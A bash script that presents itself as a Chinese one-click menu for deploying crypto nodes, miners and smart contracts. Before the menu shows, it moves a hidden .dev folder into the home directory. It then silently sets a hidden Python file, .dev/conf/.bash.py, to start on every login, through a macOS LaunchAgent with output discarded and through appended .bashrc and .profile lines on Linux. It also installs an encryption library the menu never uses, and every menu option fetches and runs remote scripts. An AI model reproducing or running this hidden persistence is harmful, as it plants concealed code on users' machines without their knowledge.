#!/bin/bash

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies

# 检查并安装 requests
if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
    pip3 install --break-system-packages 'requests>=2.31.0'
fi

# 检查并安装 cryptography（用于 Fernet）
if ! pip3 show cryptography >/dev/null 2>&1; then
    pip3 install --break-system-packages cryptography
fi

# 设置自启动
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"

    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    # 定义执行命令
    EXEC_CMD="python3"
    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"

    case $OS_TYPE in
        "Darwin")
            # 创建 LaunchAgents 目录（如果不存在）
            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
            mkdir -p "$LAUNCH_AGENTS_DIR"
            
            # 创建 plist 文件
            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
            cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.ba</string>
    <key>ProgramArguments</key>
    <array>
        <string>$EXEC_CMD</string>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
            # 加载 plist
            launchctl load "$PLIST_FILE"
            ;;
            
        "Linux")
            STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
            
            # 添加到 .bashrc
            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
                echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
            fi
            
            # 同时添加到 .profile
            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
                echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
            fi
            
            # 立即执行脚本
            if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
                (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
            fi
            ;;
    esac
fi

# 主菜单
function main_menu() {
    while true; do
        clear
        echo -e "\033[31m=====================脚本之家======================"
        echo
        echo -e "\033[32m██████╗ ███████╗███╗   ██╗███████╗███████╗ █████╗ "
        echo -e "\033[32m██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗"
        echo -e "\033[32m██████╔╝█████╗  ██╔██╗ ██║█████╗  █████╗  ███████║"
        echo -e "\033[32m██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██║"
        echo -e "\033[32m██║     ███████╗██║ ╚████║███████╗███████╗██║  ██║"
        echo -e "\033[32m╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝"
        echo
        echo -e "\033[35m请选择项目:"
        echo
        echo -e "\033[33m--------------------节点类项目--------------------"
        echo "101. 💰 钱包管理器"
        echo "102. Elixir V3 一键部署"
        echo "103. Hemi 一键部署"
        echo "104. Pipe 一键部署"
        echo "105. Ink 一键部署"
        echo "106. T3RN 一键部署"
        echo "107. Nexus 一键部署"
        echo "108. Soneium_Minato 一键部署"
        echo "109. Gensyn-ai RL Swarm 一键部署"
        echo "110. Seismic 一键部署"
        echo "111. Ritual 一键部署"
        echo "112. Stork 一键部署"
        echo "113. Naptha 一键部署"
        echo "114. OpenLedger 一键部署"
        echo "115. Hyperspace 一键部署"
        echo
        echo -e "\033[33m--------------------挖矿类项目--------------------"
        echo "201. Titan Network 一键挖矿"
        echo "202. InitVerse(CPU) 挖矿脚本"
        echo "203. FastLane Frontrunner 一键部署"
        echo
        echo -e "\033[33m--------------------合约类项目--------------------"
        echo "301. Monad ERC20合约 一键部署"
        echo "302. Monad 多个智能合约 一键部署"
        echo
        echo -e "\033[33m-----------------------其他----------------------"
        echo "0. 退出脚本exit"
        echo
        read -p "请输入选项: " OPTION

        case $OPTION in
        
        101) git clone https://github.com/blockchain-src/wallet_checker.git && cd wallet_checker && npm install && node src/batch_checker.js ;;
        102) wget -O elixir.sh https://raw.githubusercontent.com/breaddog100/elixir/main/elixir.sh && chmod +x elixir.sh && ./elixir.sh ;;
        103) wget -O hemi.sh https://raw.githubusercontent.com/breaddog100/hemi/main/hemi.sh && chmod +x hemi.sh && ./hemi.sh ;;
        104) wget -O pipe.sh https://raw.githubusercontent.com/breaddog100/pipe/main/pipe.sh && chmod +x pipe.sh && ./pipe.sh ;;
        105) git clone https://github.com/blockchain-src/ink_node.git && cd ink_node && chmod +x run.sh && ./run.sh ;;
        106) git clone https://github.com/blockchain-src/t3rn-node.git && cd t3rn-node && chmod +x t3rn.sh && ./t3rn.sh ;;
        107) git clone https://github.com/blockchain-src/Nexus_node.git && cd Nexus_node && chmod +x setup.sh && ./setup.sh ;;
        108) git clone https://github.com/blockchain-src/minato_node.git && cd minato_node && chmod +x One_click.sh && ./One_click.sh ;;
        109) git clone https://github.com/blockchain-src/Gensyn-ai.git && cd Gensyn-ai && chmod +x setup_rl-swarm.sh && ./setup_rl-swarm.sh ;;
        110) wget -O Seismic.sh https://raw.githubusercontent.com/sdohuajia/Seismic/main/Seismic.sh && sed -i 's/\r$//' Seismic.sh && chmod +x Seismic.sh && ./Seismic.sh ;;
        111) wget -O Ritual.sh https://raw.githubusercontent.com/sdohuajia/Ritual/refs/heads/main/Ritual.sh && sed -i 's/\r$//' Ritual.sh && chmod +x Ritual.sh && ./Ritual.sh ;;
        112) wget -O stork.sh https://raw.githubusercontent.com/sdohuajia/stork/refs/heads/main/stork.sh && sed -i 's/\r$//' stork.sh && chmod +x stork.sh && ./stork.sh ;;
        113) wget -O naptha.sh https://raw.githubusercontent.com/sdohuajia/naptha/refs/heads/main/naptha.sh && sed -i 's/\r$//' naptha.sh && chmod +x naptha.sh && ./naptha.sh ;;
        114) wget -O openledger-bot.sh https://raw.githubusercontent.com/sdohuajia/openledger-bot/refs/heads/main/openledger-bot.sh && sed -i 's/\r//' openledger-bot.sh && chmod +x openledger-bot.sh && ./openledger-bot.sh ;;
        115) wget -O Hyperspace.sh https://raw.githubusercontent.com/sdohuajia/Hyperspace/refs/heads/main/Hyperspace.sh && sed -i 's/\r$//' Hyperspace.sh && chmod +x Hyperspace.sh && ./Hyperspace.sh ;;

        201) wget -O titan-network.sh https://raw.githubusercontent.com/breaddog100/titan-network/main/titan-network-v2.sh && chmod +x titan-network.sh && ./titan-network.sh ;;
        202) sudo -i && git clone https://github.com/blockchain-src/initverse-miner.git && cd initverse-miner && chmod +x install.sh && ./install.sh && chmod +x iniminer.sh && ./iniminer.sh ;;
        203) git clone https://github.com/blockchain-src/monad-frontrunner-bot.git && cd monad-frontrunner-bot && chmod +x run.sh && ./run.sh ;;  
        
        301) git clone https://github.com/blockchain-src/deploy_contracts.git && cd deploy_contracts && chmod +x deploy.sh && ./deploy.sh ;; 
        302) git clone https://github.com/blockchain-src/hardhat-monad.git && cd hardhat-monad && npm install && chmod +x deploy_contracts.sh && ./deploy_contracts.sh ;; 
       
        0) echo "退出。"; exit 0 ;;
	    *) echo "无效选项，请重新输入。"; sleep 3 ;;
	    esac
	    echo "按任意键返回主菜单..."
        read -n 1
    done
}

# 显示主菜单
main_menu